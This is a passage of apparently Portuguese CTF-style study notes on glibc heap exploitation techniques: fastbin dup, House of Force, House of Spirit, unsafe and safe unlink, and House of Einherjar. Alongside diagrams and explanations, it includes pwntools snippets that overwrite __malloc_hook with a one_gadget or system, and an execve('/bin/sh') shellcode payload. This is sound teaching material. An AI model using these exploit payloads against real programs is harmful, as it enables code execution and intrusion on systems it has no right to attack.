<blockquote>
<p>head : chunk_A -&gt; Chunk_B -&gt; chunk_A -&gt; [...]</p>
</blockquote>
<ul>
<li>chunk_A = malloc()</li>
<li>chunk_B = malloc()</li>
</ul>
<blockquote>
<p>head : chunk_A -&gt; [...]</p>
</blockquote>
<ul>
<li>edit(chunk_A, <strong>0x50</strong>)</li>
<li>malloc()</li>
</ul>
<blockquote>
<p>head : 0x50</p>
</blockquote>
<p>Agora usar a técnica de alocar um chunk, usando um Fastbin Dup no <code>0x50</code>:</p>
<ul>
<li>Double free</li>
</ul>
<blockquote>
<p>head : chunk_A -&gt; Chunk_B -&gt; chunk_A -&gt; [...]</p>
</blockquote>
<ul>
<li>chunk_A = malloc()</li>
<li>chunk_B = malloc()</li>
<li>edit(chunk_A, <strong>main_arena + 48 - 8</strong>)</li>
<li>malloc()</li>
<li>fake = malloc() <strong>Fake Chunk Na Main_Arena</strong></li>
</ul>
<p>Agora temos um chunk que nos permite dar write na main_arena</p>
<blockquote>
<p>OBS :
fastbin 0x60 dentro da main arena == main_arena + 48</p>
<p>alvo == main_arena + 48 - 8</p>
<p>alvo + 8 == head do 0x60 fastbin a.k.a. &quot;0x50&quot;, passando o 
teste ja que o nosso fake chunk tem tamanho 0x50</p>
</blockquote>
<blockquote>
<p>OBS 2 : Esse endereço pode mudar dependendo da versão do malloc, calcula 
de novo ai</p>
</blockquote>
<h4 id="exemplo-malloc-antigo"><a class="header" href="#exemplo-malloc-antigo">Exemplo malloc antigo</a></h4>
<p>Agora, por exemplo, em versões antigas podemos alterar o <code>top</code> na main_arena</p>
<ul>
<li>top = malloc()</li>
<li>edit(top, b'G'*48 + p64(libc.sym.__malloc_hook-0x24)) </li>
</ul>
<pre><code>              Pad    +            top
</code></pre>
<p>Agora o proximo malloc vai alocar proximo ao <strong>__malloc_hook</strong></p>
<ul>
<li>malloc(b'H'*20 + p64(one_gadget)) <strong>Esse chunk ocupa o __malloc_hook</strong> </li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="house-of-force"><a class="header" href="#house-of-force">House of Force</a></h1>
<ul>
<li><a href="heap/malloc/HouseOfForce.html#house-of-force">House of Force</a></li>
<li><a href="heap/malloc/HouseOfForce.html#teoria">Teoria</a></li>
<li><a href="heap/malloc/HouseOfForce.html#va-wrap-around">VA Wrap-Around</a></li>
<li><a href="heap/malloc/HouseOfForce.html#limita%C3%A7%C3%B5es">Limitações</a></li>
<li><a href="heap/malloc/HouseOfForce.html#fontes-e-materiais-para-praticar">Fontes e Materiais para praticar</a></li>
</ul>
<h1 id="teoria-8"><a class="header" href="#teoria-8">Teoria</a></h1>
<p>A técnica da House Of Force consiste em usar um heap overflow para alterar o 
tamanho do top_chunk para o valor máximo ( 0xffffffffffffffff ) ... permitindo 
que um malloc enorme seja alocado pelo top_chunk!</p>
<p>Esse chunk enorme ira cobrir a distancia entre o alvo e o heap atual!</p>
<pre><code class="language-py"> ______________________________
|                              |  
|  Resto do heap blablabla     |  
|______________________________| 
|             | Size: 0x20     |  &lt;- malloc(0x18)
|   AAAAAAAAAAAAAAAAAAAAAAA    |  &lt;- write(&quot;A&quot;*0x20)
|______________________________|
|                              |  
| Top size: 0x3c0              |  &lt;- Nao teve overflow
|______________________________|

 Agora, vamos usar o overflow para deixar o top_chunk.size gigante
 ______________________________
|                              |  
|  Resto do heap blablabla     |  
|______________________________| 
|             | Size: 0x20     |  &lt;- malloc(0x18)
|   AAAAAAAAAAAAAAAAAAAAAAA    |  &lt;- write(&quot;A&quot;*0x20 + p64(0xffffffffffffffff))
|______________________________|
|                              |  
| Top size: 0xffffffffffffffff |
|______________________________|

Agora, vamos alocar um chunk gigante!

Vamos supor que o heap começa em 0x40000 e o alvo esta em 0x60704

Alem disso, vamos supor que o top_size esta no endereço 0x400d0

Assim, queremos alocar um chunk que pare um pouco antes do alvo, 
esse chunk servira somente para &quot;andar ate la&quot;

Assim, quando alocarmos um chunk, ele vai ocupar a mesma posição que o alvo

&gt;&gt;&gt; hex((0x60704 - 0x20) - 0x400d0)
'0x20614'
 ______________________________  ___ 0x40000
|                              | 
|  Resto do heap blablabla     |  
|______________________________| 
|             | Size: 0x20     |
|   AAAAAAAAAAAAAAAAAAAAAAA    |
|______________________________| ___ 0x400d0 -&gt; &amp;top_size ficava aqui
|                              |
|     NAO ESCREVER NESSE       |  &lt;- malloc(0x20614)
|     CHUNK, ELE PODE ESTAR    |  
|     PASSANDO POR MEMORIA     |
|  READ_ONLY E CAUSAR SEGFAULT |
|                              |  
 ... ...  ... ... ...  ...  ...
|______________________________| ___ 0x606e4 -&gt; alvo - 0x20
|                              |  
| Top size: 0xfffffffffffdf9eb |
|______________________________|

Agora, um ultimo chunk para cobrir alvo

 ______________________________  ___ 0x40000
|                              | 
|  Resto do heap blablabla     |  
|______________________________| 
|             | Size: 0x20     |
|   AAAAAAAAAAAAAAAAAAAAAAA    |
|______________________________| ___ 0x400d0 -&gt; &amp;top_size ficava aqui
|                              |
|     NAO ESCREVER NESSE       |
|     CHUNK, ELE PODE ESTAR    |  
|     PASSANDO POR MEMORIA     |
|  READ_ONLY E CAUSAR SEGFAULT |
|                              |  
 ... ...  ... ... ...  ...  ...
|______________________________| ___ 0x606e4
|             | Size: 0x30     |  
|                              | &lt;- malloc(0x28) 
|                              |  
|                              | ___ 0x60704 -&gt; alvo
|                              |  
|______________________________| ___ 0x60714 
|                              |  
| Top size: 0xfffffffffffdf9cb |
|______________________________|

Um edit no chunk pode alterar o alvo!

def Resumo():
    Chunk_1 -&gt; *top_size = 0xfff...
    Chunk_2 -&gt; gigante, usado para atravessar a distancia
    Chunk_3 -&gt; Pode alterar o alvo


Na pratica, o Chunk_3 talvez tenha um tamanho que 
voce nao controle! Ou, alguma outra limitação assim!

A situação ideal ocorre quando o inicio da user_data do Chunk_3 
coincide com o endereço do alvo! pois voce nao precisa usar 
padding para alcançar o alvo e portanto, nao arrisca 
danificar outras partes da memoria!

Então quando estiver praticando, vale a pena ficar brincando com o tamanho do 
Chunk_2 para acertar a mira direitinho :D
</code></pre>
<h1 id="va-wrap-around"><a class="header" href="#va-wrap-around">VA Wrap-Around</a></h1>
<p>No caso anterior, o endereço do alvo era maior que o do heap!</p>
<p>heap: 0x40000 &lt;------&gt; alvo: 0x60704 </p>
<p>E caso seja ao contrario? Vamos precisar dar uma volta no VA space!</p>
<blockquote>
<p>VA = Virtual Address = Endereço Virtual = 0x0000000000000000 ate 0xffffffffffffffff</p>
</blockquote>
<p>Os endereços no VA space dao um loop, assim:</p>
<blockquote>
<p>Se voce esta em 0xffffffffffffff45 e anda para frente, voce vai terminar em 0x0000000000000000a3 ! Dando uma volta no VA space! </p>
</blockquote>
<p>Nos podemos fazer o mesmo com o <code>Chunk_2</code> ! Permitindo que o <code>Chunk_3</code> fique 
em um endereço anterior ao heap! :D</p>
<p>Para encontrar o tamanho do <code>Chunk_2</code> que possibilite isso, podemos usar a função:</p>
<pre><code class="language-py">def wrap(A,B):
    return (0xffffffffffffffff - A)+B
    #      || tamanho ate        || O quanto andar depois
    #      || O fim do VA space  || de dar o loop 
    
    # Com A = base_do_heap + quantidade_gasta = &amp;top_size
    # B = alvo - 0x20 (tamanho do Chunk_3)  
</code></pre>
<h1 id="limitações"><a class="header" href="#limitações">Limitações</a></h1>
<ul>
<li>Requer um heap leak</li>
<li>Versão Glibc &lt; 2.29</li>
</ul>
<h1 id="fontes-e-materiais-para-praticar"><a class="header" href="#fontes-e-materiais-para-praticar">Fontes e Materiais para praticar</a></h1>
<ul>
<li><a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.27/house_of_force.c">shellphish/how2heap</a></li>
<li>La também tem o link pra alguns ctfs que usam house of force!</li>
<li><a href="https://www.udemy.com/share/1039QMBEYadFpWRXo=/">O curso de Heap Exploits do Max Kamper</a> </li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="house-of-spirit"><a class="header" href="#house-of-spirit">House of Spirit</a></h1>
<ul>
<li><a href="heap/malloc/HouseOfSpirit.html#house-of-spirit">House of Spirit</a></li>
<li><a href="heap/malloc/HouseOfSpirit.html#teoria">Teoria</a></li>
<li><a href="heap/malloc/HouseOfSpirit.html#fastbins">Fastbins</a></li>
<li><a href="heap/malloc/HouseOfSpirit.html#smallbins">Smallbins</a></li>
<li><a href="heap/malloc/HouseOfSpirit.html#exec-converter-em-fastbin-dup">Exec: Converter em Fastbin Dup</a></li>
</ul>
<h1 id="teoria-9"><a class="header" href="#teoria-9">Teoria</a></h1>
<p>House Of Spirit é uma tecnica que nos permite dar <code>free</code> um chunk falso que 
fica por exemplo, no <code>heap</code>, <code>stack*</code>, <code>data</code>,... ou qualquer outro lugar</p>
<p>A tecnica é parecida com um fastbin dup, porem menos versátil e mais difícil de 
executar, porem nos permite usar vulnerabilidades fora do heap (como um stack 
bof) e traze-las para o contexto do heap.</p>
<p>Assim, nos criamos um chunk falso e chamamos <code>free()</code> nele!</p>
<p>Um exemplo da vida real seria por exemplo, por meio de um stack bof alterar
um pointer para o heap, ja que eles sao muito comuns, e apontar para o chunk 
falso.</p>
<p>Entre as restrições no chunk falso temos:</p>
<ul>
<li>tamanho
<ul>
<li>Voce devera passar pelas mitigações ja pre-existentes para aquele tipo de 
chunk</li>
<li><code>fastbins</code> é o mais fácil</li>
<li><code>small</code> tem mais mitigações porem pode ser usado junto com remaindering 
para criar mais um chunk logo em frente do chunk falso</li>
<li>Eu nao vejo pq usar <code>large</code> poderia ser vantajoso, mas se quiser testar </li>
</ul>
</li>
<li>flags
<ul>
<li>Para precisarmos passar pelo menor numero de mitigações possível, temos: </li>
<li>PREV_USE = 1</li>
<li>IS_MMAPED = 0</li>
<li>NON_MAIN = 0</li>
<li>bit sem uso = 0</li>
</ul>
</li>
<li>Endereço
<ul>
<li>Pointer alinhado a 16 bytes</li>
<li>smallbins: endereço &lt;= heap + top_size </li>
</ul>
</li>
</ul>
<p>Alem disso, malloc ira checar se o tamanho do proximo chunk é valido :
<code>&amp;chunk + chunk.size + 8</code></p>
<pre><code>0000000000000000  0000000000000031 &lt;--| fake 
0000000000000000  0000000000000000    |
0000000000000000  0000000000000000 ___| 
0000000000000000   TAMANHO VALIDO  &lt; &amp;fake + fake.size + 8 = tamanho valido
0000000000000000  0000000000000000
</code></pre>
<p>Então voce pode simplesmente lotar aquela area com fenceposts ou qualquer valor razoável, sei la, <code>0x21</code>... nao importa muito</p>
<h1 id="fastbins-1"><a class="header" href="#fastbins-1">Fastbins</a></h1>
<p>Fazer a HoS é mais fácil com os fastbins, e voce so deve usar outro tipo caso 
seja vital voce usar remaindering (ou outra capacidade de chunk maiores) ou 
caso voce nao possa controlar o tamanho... Caso contrario use um fastbin... </p>
<p>Nos poderíamos por exemplo, num programa que armazena nosso <code>username</code> no 
<code>data</code>, nos vamos usa-lo para armazenar o chunk falso, assim definindo-o como:</p>
<pre><code class="language-py">username = flat(
    0x31,
    0,0,0,0,0,
    0x21,# tamanho valido
)
</code></pre>
<p>O programa possui pointers no heap para o <code>data</code> (<code>+ 0x10</code>) dos chunks... 
Porem alguém vacilou e deixou passar um BoF, e como o pointer é uma variável 
local da função, voce nao precisara nem se quer acertar o canary:</p>
<pre><code>| Buf | Dados | Buf Buf | pointers | Buf Buf Buf | canary, rbp, rip, essas coisas
              | Overflow aqui
</code></pre>
<p>Assim, se por meio do overflow colocarmos um dos pointers como: <code>username + 0x10</code> 
( + 0x10 para ajustar, levando em consideração que o pointer originalmente 
apontava para o <code>data</code> de um chunk...</p>
<p>E agora quando o programa chamar <code>free</code> nesse pointer, BOOM! Chunk falso no 
fastbin!</p>
<h1 id="smallbins"><a class="header" href="#smallbins">Smallbins</a></h1>
<p>Para os smallbins o procedimento é similar!</p>
<p>A parte do overflow continua tudo igual, a única mudança é que ao apos o 
tamanho valido, colocamos um fencepost...</p>
<p>Assim, nos evitamos que o chunk consolide para frente!</p>
<pre><code class="language-py">username = flat(
    0xa1,
    0,0,0,0,0,
    0x11, # tamanho valido
    0
    0x11, # nao consolidar
    0
</code></pre>
<p>Alem disso, o endereço do chunk falso deve ser ANTES do heap, para evitar uma 
mitigação</p>
<h1 id="exec-converter-em-fastbin-dup"><a class="header" href="#exec-converter-em-fastbin-dup">Exec: Converter em Fastbin Dup</a></h1>
<p>Bom, e como podemos prosseguir? nos podemos alocar esse chunk e usa-lo para 
dar write, mas isso nao e la muito util, se nos ja podíamos escrever 
naquela região pra inicio de conversa... então vamos precisar de algo a mais 
para conseguir uma shell</p>
<p>Para conseguir execução de código, nos poderíamos por exemplo corromper o 
malloc_hook... mas <code>find_fake_fast</code> em condições normais somente retornara um 
chunk de tamanho <code>7f</code> incompatível com o House Of Spirit por causa das flags...</p>
<p>Então vamos voltar a essencia do que esse ataque: free esta sendo chamado num 
pointer, e nos podemos dar overflow nesse pointer</p>
<p>Esse se nos apontarmos esse pointer para um chunk que ja foi liberado? </p>
<p><strong>Double Free!!!!</strong> </p>
<p>Vamos continuar com o exemplo anterior, nos podemos alterar pointers para o 
heap:</p>
<pre><code>| Buf | Dados | Buf Buf | pointers | Buf Buf Buf | canary, rbp, rip, essas coisas
              | Overflow aqui
</code></pre>
<p>E vamos supor o estado atual do heap:</p>
<pre><code class="language-x86asm">0x70 - chunk_A
0x20 - Chunk_B
0x70 - chunk_C
0x50 - chunk_D
</code></pre>
<p>e o nosso overflow corrompe primeiro o pointer para chunk_D!</p>
<pre><code>| Buf Buf | pointer_D pointer_C pointer_B pointer_A |
AAAAAAAAA  
</code></pre>
<p>Para tornar o ataque independente de heap leak, nos podemos alterar somente o 
LSB do pointer</p>
<p>Se alteramos para <code>0x00</code>, ele apontara para o inicio do heap, portanto se 
alterarmos para <code>0x10</code>, estaremos apontando para a user_data do chunk_A</p>
<p>E se mudarmos para <code>0x80</code>, para a user_data do chunk_B</p>
<p>Assim, podemos escolher um deles para dar um double free, eu vou escolher o A!</p>
<p>Como o A é um fastbin, nos convertemos a House Of Spirit em um fastbin dup...</p>
<p>mesmo se o programa manualmente cuidar dos chunks para previvir um double free,
esse ataque ainda funcionaria, pois tecnicamente a gente chamou free em 
pointers diferentes :D</p>
<pre><code class="language-py">overflow(b&quot;A&quot;*0x120 + &quot;\x10&quot;) # pointer_D -&gt; chunk_A
free(pointer_A)
free(pointer_C) # Free num chunk do mesmo fastbin
free(pointer_D) # Fastbin dup
</code></pre>
<blockquote>
<p>Agora o fastbin 0x70 fica:<br />
head: chunk_A -&gt; chunk_B -&gt; chunk_A</p>
</blockquote>
<p>E voce pode prosseguir normalmente com o fastbin dup, agora podendo criar um 
chunk falso no malloc_hook... Ja que o tamanho <code>7f</code> é compatível com o fastbin 
dup :D</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="unsafe-unlink"><a class="header" href="#unsafe-unlink">Unsafe Unlink</a></h1>
<ul>
<li><a href="heap/malloc/unsafeUnlink.html#unsafe-unlink">Unsafe Unlink</a></li>
<li><a href="heap/malloc/unsafeUnlink.html#teoria">Teoria</a>
<ul>
<li><a href="heap/malloc/unsafeUnlink.html#overflow">Overflow</a></li>
<li><a href="heap/malloc/unsafeUnlink.html#unlink">Unlink</a></li>
</ul>
</li>
<li><a href="heap/malloc/unsafeUnlink.html#ataque">Ataque</a></li>
<li><a href="heap/malloc/unsafeUnlink.html#final">Final</a></li>
</ul>
<p>O Unsafe Unlink é o equivalente daquele BoF tradicional com 
o shellcode na stack, o mais básico de todos!</p>
<p>Assim, ele requer que NX e todas essas bobagens estejam 
desligadas... :P</p>
<h1 id="teoria-10"><a class="header" href="#teoria-10">Teoria</a></h1>
<h2 id="overflow-1"><a class="header" href="#overflow-1">Overflow</a></h2>
<pre><code> __________________
|         |  size  |  Nosso chunk
|                  |
|                  |
|__________________|
| prev_sz |  size  | Free chunk
|    fd   |   bk   |
|                  |
|__________________|


BBBBBBBuuuuuuuffffeeerr oooovveeerrrrfllloowww

 __________________
|         |  size  |  Nosso chunk
| AAAAAAAAAAAAAAAA |
| AAAAAAAAAAAAAAAA |
|__________________|
| AAAAAAA |  0x91  | Free chunk
| FFFFFFF | BBBBBB | obs: precisamos colocar
|                  |      um tamanho valido
|__________________|

Assim, nos alteramos o fd e o bk
</code></pre>
<h2 id="unlink"><a class="header" href="#unlink">Unlink</a></h2>
<pre><code>Quando esse free chunk for alocado, ele precisara 
ser UN-LINKADO da free list

Fazer o proximo chunk apontar para o chunk anterior e o
chunk anterior apontar para o proximo chunk

Isto e:
    bk_velho = vitima.bk 
    fd_velho = vitima.fd

    vitima.fd.bk = bk_velho 
    vitima.bk.fd = fd_velho


assim:              vitima   
 ___   bk  ___       _V_       ___       ___ 
|   | --&gt; |   | --&gt; |   | --&gt; |   | --&gt; |   |
|___| &lt;-- |___| &lt;-- |___| &lt;-- |___| &lt;-- |___|
      fd              

            BK                  FD
 ___       _V_  BK.fd          _V_       ___ 
|   | --&gt; |   | --&gt; ----&gt; --&gt; |   | --&gt; |   |
|___| &lt;-- |___| &lt;-- &lt;---- &lt;-- |___| &lt;-- |___|              
                     ___ FD.bk
                    |   |
                    |_ _|
                      ^
                    vitima   
</code></pre>
<h1 id="ataque"><a class="header" href="#ataque">Ataque</a></h1>
<p>Assim, se substituirmos o <code>fd</code> e o <code>bk</code>, temos um 
primitivo de <code>reflected-write</code> !</p>
<p>Assim, nos escrevemos:</p>
<ul>
<li><code>fd falso</code> em <code>bk falso + 0x18</code></li>
<li><code>bk falso</code> em <code>fd falso + 0x10</code></li>
</ul>
<p>Portanto, os dois endereços precisam ser validos para 
nao gerar SEGFAULT ! D:</p>
<p>Isso nos deixa com poucas opções,.... porem nao existem
proteções então talvez seja possível!</p>
<p>Nos podemos colocar a payload no heap (sem <code>ASLR</code>, então 
temos o endereço dela, e sem <code>NX</code> então ela executa) e 
comprometer algum pointer que nos de execução, por exemplo:</p>
<ul>
<li>Qualquer um dos __malloc_hooks</li>
<li>GOT (Sem <code>RELRO</code>)</li>
<li>.dtors (ainda existia nos bins velhos)</li>
</ul>
<p>Porem temos um problema: o write refletido, alem de 
fazer um pointer apontar para o nossa payload, acaba 
escrevendo um valor no meio da payload! :(</p>
<p>Assim, vamos precisar de um <code>NOP slide</code> especial!</p>
<pre><code>90
  90
    90
      90    &lt;---- Mira execução aqui
        90
          90
            JMP Payload ---------
              90                |
                90              |             
                  90            |    
corrupção  ----&gt;    90          |
cai aqui              90        |
                        90      |
                          90    V
                            PAYLOAD
</code></pre>
<p>Assim, a payload fica intacta</p>
<blockquote>
<p>Obs: se voce tem um <code>write-after-free</code>, basta fazer</p>
<ul>
<li>Overflow</li>
<li>Corrompe</li>
<li>Write: nova payload</li>
<li>Trigger</li>
</ul>
</blockquote>
<p>E colocando tudo isso junto:</p>
<h1 id="final"><a class="header" href="#final">Final</a></h1>
<pre><code class="language-py">    asm(&quot;jmp shellcode;&quot; + &quot;nop;&quot;*0x20 + &quot;shellcode:&quot; + shellcraft.execve(&quot;/bin/sh&quot;)) + 
    b'A'*pad + 
    flat(
      0x91,#                size
      heap - 0x18 + 0x28,#  fd - 0x18 | + 0x28 offset para o nosso chunk por exemplo
      __malloc_hook - 0x10,# bk - 0x10
    )
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><ul>
<li><a href="heap/malloc/safeUnlink.html#teoria">Teoria</a></li>
<li><a href="heap/malloc/safeUnlink.html#data">.data</a>
<ul>
<li><a href="heap/malloc/safeUnlink.html#exploit">Exploit</a>
<ul>
<li><a href="heap/malloc/safeUnlink.html#safe-unlink">Safe Unlink</a></li>
<li><a href="heap/malloc/safeUnlink.html#edit-no-usr123-para-controlar-todos-os-pointers">Edit no usr123 para controlar todos os pointers</a></li>
<li><a href="heap/malloc/safeUnlink.html#arbwrite---definir-alvo">Arbwrite - Definir alvo</a></li>
<li><a href="heap/malloc/safeUnlink.html#arbwrite---definir-valor">Arbwrite - Definir valor</a></li>
</ul>
</li>
<li><a href="heap/malloc/safeUnlink.html#unindo-tudo">Unindo tudo</a></li>
</ul>
</li>
<li><a href="heap/malloc/safeUnlink.html#outros-exemplos">Outros exemplos</a></li>
</ul>
<h2 id="teoria-11"><a class="header" href="#teoria-11">Teoria</a></h2>
<p>O safe unlink depende muito da implementação do programa, isso quer dizer 
que nao existe uma formula bonitinha para conseguir uma shell...</p>
<p>A mitigação que foi introduzida se consiste em:</p>
<ul>
<li><code>assert</code>(vitima.fd.bk == vitima)</li>
<li><code>assert</code>(vitima.bk.fd == vitima)</li>
</ul>
<p>Assim, agora alem de o <code>fd falso</code> e <code>bk falso</code> precisarem ser endereços 
validos, precisaremos de que:</p>
<ul>
<li><code>fd falso</code> + 0x18 == pointer para <code>vitima</code></li>
<li><code>bk falso</code> + 0x10 == pointer para <code>vitima</code></li>
</ul>
<p>Assim, precisamos de 1 ou 2 pointers que apontam para o nosso chunk, e que 
esse pointer seja importante.</p>
<h2 id="data"><a class="header" href="#data">.data</a></h2>
<p>Caso o programa tenha um struct com pointers para o heap, e acesse o heap por meio deles</p>
<pre><code class="language-x86asm">.data
struct UsuárioLogado:
    nome: pointer para chunk, -&gt; aponta para vitima
    senha: pointer para chunk,
    metadados: pointer para chunk,

</code></pre>
<p>E o programa use:</p>
<pre><code>edit( * usr123.nome, novo_nome )
</code></pre>
<h3 id="exploit-4"><a class="header" href="#exploit-4">Exploit</a></h3>
<h4 id="safe-unlink"><a class="header" href="#safe-unlink">Safe Unlink</a></h4>
<p>Nos podemos mirar o <code>fd falso</code> e <code>bk falso</code> apontando para o pointer que 
aponta para a vitima, passando o check de segurança...</p>
<p>Agora <code>fd</code> sera escrito no <code>*bk</code> e <code>bk</code> sera escrito no <code>*fd</code> (+ os offsets), 
mas os dois sao o mesmo alvo, então como consequência somente teremos a 
alteração de <code>usr123.nome</code> para o valor de <code>fd/bk</code> isto e:
ele aponta para ele mesmo (ou antes por causa dos offsets (+0x16,0x10,...))
<code>usr123.nome</code> = <code>&amp; usr123.nome</code></p>
<h4 id="edit-no-usr123-para-controlar-todos-os-pointers"><a class="header" href="#edit-no-usr123-para-controlar-todos-os-pointers">Edit no usr123 para controlar todos os pointers</a></h4>
<p>Agora, caso tentemos editar o nome, vamos na verdade ter um write no struct 
<code>usr123</code> (e adjacentes)</p>
<pre><code>edit( * usr123.nome, novo_nome )
</code></pre>
<p>E agora que controlamos todos os pointers por meio do <code>novo_nome</code>, podemos 
altera-los, com cada um abrindo uma nova avenida de exploitação... </p>
<h4 id="arbwrite---definir-alvo"><a class="header" href="#arbwrite---definir-alvo">Arbwrite - Definir alvo</a></h4>
<p>O mais obvio é alterar o <code>usr123.nome</code> de novo... nos dando um <code>arbwrite</code></p>
<pre><code>edit( * usr123.nome, __malloc_hook - 0x20 )
</code></pre>
<h4 id="arbwrite---definir-valor"><a class="header" href="#arbwrite---definir-valor">Arbwrite - Definir valor</a></h4>
<p>agora <code>usr123.nome</code> aponta para o <code>__malloc_hook</code> e o proximo edit vai 
altera-lo...</p>
<h3 id="unindo-tudo-1"><a class="header" href="#unindo-tudo-1">Unindo tudo</a></h3>
<blockquote>
<p><code>mudarNome</code>(<code>novo_nome</code>) = wrapper para interagir com o programa chamando o código de editar o nome</p>
</blockquote>
<ul>
<li>Start
<ul>
<li><code>usr123.nome</code> -&gt; vitima</li>
</ul>
</li>
<li>Safe Unlink apontando para <code>usr123.nome</code>
<ul>
<li><code>usr123.nome</code> -&gt; <code>usr123.nome</code></li>
</ul>
</li>
<li>mudarNome( <code>__malloc_hook</code> - <code>0x20</code> ) 
<ul>
<li><code>usr123.nome</code> -&gt; antes do <code>__malloc_hook</code></li>
</ul>
</li>
<li>mudarNome( <code>A</code>*<code>pad</code> + <code>libc.system</code> )</li>
</ul>
<h2 id="outros-exemplos"><a class="header" href="#outros-exemplos">Outros exemplos</a></h2>
<p>Outros cenários que podem ser viáveis passar essa mitigação incluem:</p>
<ul>
<li>Pointer na stack para o chunk
<ul>
<li>talvez de para alterar o ret salvo</li>
</ul>
</li>
<li>Voce forjar o seu próprio pointer caso tenha um heap leak</li>
<li>Os metadados de um free chunk que aponte para vitima</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><ul>
<li><a href="heap/malloc/HouseOfEinherjar.html#prerrequisitos">Prerrequisitos</a></li>
<li><a href="heap/malloc/HouseOfEinherjar.html#chunk-falso">Chunk falso</a>
<ul>
<li><a href="heap/malloc/HouseOfEinherjar.html#obs-libc-">OBS: libc &lt;</a></li>
</ul>
</li>
<li><a href="heap/malloc/HouseOfEinherjar.html#free">Free</a></li>
<li><a href="heap/malloc/HouseOfEinherjar.html#vitima-adjacente-ao-top">Vitima adjacente ao top</a></li>
</ul>
<p>Na House of Einherjar, nos queremos que malloc retorne um chunk 
<strong>FORA</strong> do heap (<code>.data</code>, etc...) usando um 
<code>single null byte overflow</code> (aka <code>poison null byte</code>) contra um 
chunk alocado. Quando somente um null byte vaza o buffer, 
comumente sendo um null byte de finalização de strings....</p>
<h1 id="prerrequisitos"><a class="header" href="#prerrequisitos">Prerrequisitos</a></h1>
<p>Para isso. alem do overflow, vamos precisar de um infoleak do 
heap, e um do endereço do chunk falso. Pois nos vamos consolidar 
um chunk ate o nosso chunk falso.</p>
<p>Alem disso, o chunk vitima do overflow precisa ter tamanho 0x100, 
0x200, etc... Pois, caso o tamanho fosse, por exemplo 0x30, ele 
simplesmente viraria 0x00, o que nao seria muito util. Assim, o 
nosso overflow nao muda o tamanho do chunk, somente as flags:</p>
<blockquote>
<p>0x0201 -&gt; 0x0200 (mesmo size, sem prev_use)</p>
</blockquote>
<p>Assim, quando chamarmos free no chunk vitima, por ter seu 
<code>prev_use=0</code>, ele vai tentar consolidar com o chunk de trás (obs: 
considerações adicionais sobre consolidar pra frente com o top 
chunk ao final do post). </p>
<p>Assim, nos devemos alterar o <code>prev-size</code> e deixa-lo enorme, para 
que alcance o chunk falso:</p>
<pre><code> ____________  
|     | size | &lt;- FAKE
|  fd |  bk  |      
|____________|
     ....

     ....

     ....

     ....
 ____________
|     | size |
| AAAAAAAAAA |
| AAAAAAAAAA |
|     ...    |
| AAAAAAAAAA |
| prev | 200 | -&gt; prev_use desativado
|____________|

</code></pre>
<p>o <code>prev</code> deve ser igual ao offset: </p>
<blockquote>
<p>&amp;<code>vitima</code> - &amp;<code>FAKE</code></p>
</blockquote>
<h1 id="chunk-falso"><a class="header" href="#chunk-falso">Chunk falso</a></h1>
<p>Alem disso, como nos vamos consolidar, precisaremos passar pelo 
SAFE unlink... Portanto, basta colocar:</p>
<blockquote>
<p><code>fd</code> = <code>bk</code> = &amp;<code>FAKE</code></p>
</blockquote>
<p>Alem disso, por causo do check: <code>corrupted size versus prev size</code>, 
nos precisamos que o size do chunk falso também seja:</p>
<blockquote>
<p>&amp;<code>vitima</code> - &amp;<code>FAKE</code></p>
</blockquote>
<h2 id="obs-libc"><a class="header" href="#obs-libc">OBS: libc &lt;</a></h2>
<p>Nessas versões do libc, a implementação do 
<code>corrupted size versus prev size</code> foi mal feita:</p>
<pre><code class="language-C">if ( __builtin_expect (chunksize(P) != prev_size (next_chunk(P)) ,0))
    malloc_printerr (&quot;corrupted size versus prev size&quot;);
</code></pre>
<p>O prev_size usado nao é o certo, e sim calculado usando o próprio 
chunk fake</p>
<pre><code> _____________  
|      | size | 
|  fd  |  bk  | 
|             |
|     ...     |
|             |
| prev |      | &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt; E SIM ESSE
|_____________|
     ....

     ....

     ....

     ....
 ____________
|     | size |
| AAAAAAAAAA |
| AAAAAAAAAA |
|     ...    |
| AAAAAAAAAA |
| prev | 200 | &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt; NAO SERA ESSE
|____________|

</code></pre>
<p>Isso quer dizer que durante a criação do chunk falso, basta 
colocar um <code>prev_size</code> (do fake) igual ao <code>size</code>....</p>
<p>Porem existe um truque mais fácil: basta colocar <code>size=8</code></p>
<p>Assim, o endereço dos dois fica igual... ja que o <code>prev_size</code> sera 
calculado com :</p>
<blockquote>
<p>&amp;<code>FAKE</code> + <code>size</code> - <code>8</code></p>
</blockquote>
<p>Em condições normais, isso retorna o <code>prev_size</code> do proximo chunk..
Porem com <code>size=8</code>, nos temos que ele aponta para o mesmo endereço 
do <code>size</code>. Com isso, eles sao necessariamente iguais, passando o 
<code>corrupted size versus prev size</code></p>
<p>Portanto, voce tem no minimo 3 maneiras diferentes de burlar o 
mecanismo de segurança :D</p>
<h1 id="free"><a class="header" href="#free">Free</a></h1>
<p>Com tudo isso pronto, basta chamar <code>free()</code> na vitima, que ela 
sera consolidada com o chunk falso...</p>
<p>Agora, basta chamar malloc que o chunk falso sera alocado, te 
dando elevado controle sobre a <code>.data</code>...</p>
<h1 id="vitima-adjacente-ao-top"><a class="header" href="#vitima-adjacente-ao-top">Vitima adjacente ao top</a></h1>
<p>Caso a vitima esteja do lado do top chunk, ele sera consolidado 
com ela e com o fake:</p>
<pre><code> _____________  
|      | size | 
|  fd  |  bk  | 
|             |
|     ...     |
|             |
| prev |      |
|_____________|
     ....

     ....

     ....

     ....
 ____________
|     | size |
| AAAAAAAAAA |
| AAAAAAAAAA |
|     ...    |
| AAAAAAAAAA |
| prev | 200 |
|     ...    |
|     ...    |
|     ...    |
|      | top |
|____________|

</code></pre>
<p>Assim, movendo o endereço do top para &amp;<code>FAKE</code></p>
<pre><code> _____________  
|      |  top | 
|_____________| 
|             |
|             |
|             |
|             |
|_____________|
     ....

     ....

     ....

     ....
 ____________
|            |
|            |
|            |
|            |
|            |
|            |
|            |
|            |
|            |
|            |
|____________|

</code></pre>
<p>Com todas as alocações seguintes vindo de la!</p>
